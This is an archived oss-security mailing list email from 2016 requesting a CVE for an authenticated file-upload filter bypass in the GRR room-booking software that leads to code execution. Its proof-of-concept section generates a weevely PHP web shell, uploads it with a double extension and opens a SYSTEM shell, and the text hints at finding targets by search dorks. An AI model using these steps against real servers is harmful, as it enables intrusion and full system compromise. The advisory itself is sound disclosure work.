X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3774" "Tuesday" "12" "January" "2016" "20:03:27" "+0100" "Jean-Marie Bourbon" "mail.bourbon@gmail.com" "<CAORzZ6Wt3iMV-WKXO7hxp+GmXVS8PVf_yMpd-Z+dgcEY5LmgzA@mail.gmail.com>" "122" "[oss-security] GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through file upload filter bypass (authenficated)" nil nil nil "1" "2016011219:03:27" "[oss-security] GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through file upload filter bypass (authenficated)" (number mark "U       mail.bourbon Jan 12  122/3774  " thread-indent "\"[oss-security] GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through file upload filter bypass (authenficated)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17940 invoked by uid 550); 12 Jan 2016 19:24:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5728 invoked from network); 12 Jan 2016 19:03:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=e/b4L3fFQYniutMii+MHP1CAdaX04ISkE8Ex2uUH+gk=;
        b=unbrjWwMY2S9VozJuFx1Cv28ZRe4zVx6vgOpJirrSDCbD0rvaDYB1CDNCf6sy0bPtQ
         F5O3sab8j2uziAYJUJ6Z/qFgJv3KpPy3c5WqZzhx3EcPFJLq9+Z2ZavOLUPLVRMpz5ub
         MruGH8wqU55XynLC94CmWWAJYlmn3gb5sv2uM/pVH5bd7QPpQTMV0P6x8S7/6VcDgEC8
         BoKkijyfM4BGUHlzF7i+KxMlzMFwQZ32RbyeJafUyKXdhQ2oL3NKVR5aL73M+nBkc5TM
         VrE78ILmCFomeXragNgTcd+QYyttfepxOvoFxvz3K+d0JFU7FPE0IFWjQED9vRRCfLQZ
         9GVw==
MIME-Version: 1.0
X-Received: by 10.28.158.194 with SMTP id h185mr22945564wme.48.1452625408070;
 Tue, 12 Jan 2016 11:03:28 -0800 (PST)
Date: Tue, 12 Jan 2016 20:03:27 +0100
Message-ID: <CAORzZ6Wt3iMV-WKXO7hxp+GmXVS8PVf_yMpd-Z+dgcEY5LmgzA@mail.gmail.com>
From: Jean-Marie Bourbon <mail.bourbon@gmail.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Content-Type: multipart/alternative; boundary=001a114ba8ee709950052927b5b6
Subject: [oss-security] GRR <= 3.0.0-RC1 (all versions) RCE with privilege escalation through
 file upload filter bypass (authenficated)

--001a114ba8ee709950052927b5b6
Content-Type: text/plain; charset=UTF-8

Hi guys,

I'd like to request a CVE ID for the following security issue.


I. APPLICATION
======================================================================================


GRR is an open source resources manager tool used in many french public
institutions (not only!).
It permit for example to manage rooms reservations, and so much more.

Software Link:
http://grr.devome.com/fr/telechargement/category/3-versions-patch?download=7:grr-3-0-0-rc1


II. ADVISORY
======================================================================================



The application allows administrators to change the enterprise's logo
uploading a new image with .png,.jpg or .gif extension only.

Once uploaded, image name is "splitted" in an array and renamed with the
name "logo" followed by the extention saved as 2nd array's element.

This file called for example "logo.jpg" is also "chmoded" as 0666
permission
and directly accessible in image folder (img_grr by default) by all users.

Besides, the application does only a basic conditional php test
on the extension of the uploaded file.

It's possible for an attacker to add a second extension that will be
used when the image will be renamed in order to bypass this basic filter
(double extension upload filter bypassing).

So, a file called backdoor.php.jpg will be renamed as logo.php with
chmod 0666 permissions and could be used by attacker to gain more
privileges
on the targeted server (privesc due to bad file permissions and RCE).

To trigger this vulnerability it is necessary to have an administrator
account on the GRR application.

This vulnerability is a combination of 3 issues:
- predictable uploaded file names and path
- upload of any kind of file
- bad files permission when we upload this file that permit us to gain
privilegied access.

Note that it could be "dorkable" in order to find targets ... and sometimes
with trivial admin credentials ;-).


III. PROOF OF CONCEPT
======================================================================================


Generate backdoor:

    kmkz@Tapz:~#  weevely generate pass123 /tmp/3lrvs.php
    Generated backdoor with password 'pass123' in '/tmp/3lrvs.php' of 1486
byte size.
    kmkz@Tapz:~# mv /tmp/3lrvs.php /tmp/3lrvs.php.jpg


Login as admin and upload this new 'logo' > Administration > logo

Enjoy your shell!

      kmkz@Tapz:~# weevely http://laboratoire.target.fr/images/logo.php
pass123
    [+] weevely 3.2.0

    [+] Target:    laboratoire.target.fr:F:\server\grr\images
    [+] Session:    /kmkz/.weevely/sessions/
laboratoire.target.fr/logo_1.session
    [+] Shell:    System shell

    [+] Browse the filesystem or execute commands starts the connection
    [+] to the target. Type :help for more information.

    weevely> whoami
    autorite nt\system



IV. RISK
======================================================================================

By uploading a script, an attacker may be able to execute arbitrary code
on the server with elevated privileges.

This flaw may compromise the integrity of the system
(with access to sensitive informations, network shares...) and it may
conduce
to  full information system's compromission using pivots techniques and
imagination!


V. VERSIONS AFFECTED
======================================================================================

GRR 3.0.0-RC1 is vulnerable (and all previous versions)


VI. TIMELINE
======================================================================================

December 17th, 2015: Vulnerability identification
January 7th, 2016: Vendor and project developers notification
January 11th, 2016: Project developers response

@kmkz_security

--001a114ba8ee709950052927b5b6--
